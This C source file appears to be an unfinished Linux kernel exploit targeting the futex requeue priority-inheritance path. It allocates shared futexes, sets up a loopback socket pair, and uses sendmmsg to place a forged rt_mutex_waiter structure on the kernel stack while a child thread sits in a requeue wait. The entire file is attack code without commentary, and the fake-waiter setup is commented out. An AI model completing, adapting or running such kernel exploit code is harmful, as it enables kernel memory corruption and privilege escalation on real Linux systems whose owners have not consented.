#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <netinet/ip.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "futex.h"
#include "errexit.h"

int client_sockfd, server_sockfd;
struct sockaddr_in addr = {};

struct mmsghdr msgvec = {};
struct iovec msg[7] = {};

struct rt_mutex_waiter *fake_waiter, forged_waiter = {};

char buf[0x80] = {};

int *futexes, *non_pi_futex, *pi_futex;

void setup_msgs()
{
    printf("[*] Setting up the messages for the kernel stack.\n");

    for (int i = 0; i < sizeof(msg) / sizeof(msg[0]); i++)
    {
        msg[i].iov_base = &forged_waiter;
        msg[i].iov_len = sizeof(forged_waiter);
    }
    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = sizeof(msg) / sizeof(msg[0]);
}

void setup_fake_waiter()
{
    printf("[*] Setting up the fake waiter on the buffer.\n");

    fake_waiter = (struct rt_mutex_waiter *)(buf + sizeof(buf) - 8);
    fake_waiter->list_entry.prio = 120 + 12;
    fake_waiter->list_entry.prio_list.next = &forged_waiter.list_entry.prio_list;
}

void alloc_futexes()
{
    printf("[*] Allocating the futexes.\n");

    futexes = mmap(NULL, sizeof(int) * 2, PROT_READ | PROT_WRITE,
                   MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (futexes == MAP_FAILED)
        errExit("mmap");

    non_pi_futex = &futexes[0];
    pi_futex = &futexes[1];
}

void setup_sockets()
{
    int incoming_client_sockfd;

    printf("[*] Creating the client and server sockets for kernel stack modification.\n");

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(8159);

    client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (client_sockfd == -1)
        errExit("socket");
    server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sockfd == -1)
        errExit("socket");

    if (bind(server_sockfd, &addr, sizeof(addr)) == -1)
        errExit("bind");
    if (listen(server_sockfd, 1) == -1)
        errExit("listen");
}

void server_accept_forever()
{
    printf("[*] Accepting clients forever on the server.\n");

    if (fork() == 0)
    {
        while (1)
        {
            accept(server_sockfd, NULL, 0);
            printf("Received request on the server socket.\n");
        }
    }
}

int main()
{
    int ret;

    printf("forged_waiter @ %p\n", &forged_waiter);

    setup_msgs();
    // setup_fake_waiter();
    setup_sockets();
    server_accept_forever();
    printf("SKURT.\n");

    if (connect(client_sockfd, &addr, sizeof(addr)) == -1)
        errExit("connect");

    alloc_futexes();

    flock(pi_futex);

    int pid = fork();
    if (pid == -1)
        errExit("fork");
    if (pid == 0)
    {
        fwait_requeue(non_pi_futex, pi_futex, 0);
        if ((ret = sendmmsg(client_sockfd, &msgvec, 1, 0)) == -1)
            errExit("sendmmsg");
        exit(EXIT_SUCCESS);
    }

    sleep(1);
    frequeue(non_pi_futex, pi_futex, 1, 0);
    *pi_futex = 0;
    frequeue(pi_futex, pi_futex, 1, 0);

    wait(NULL);
}
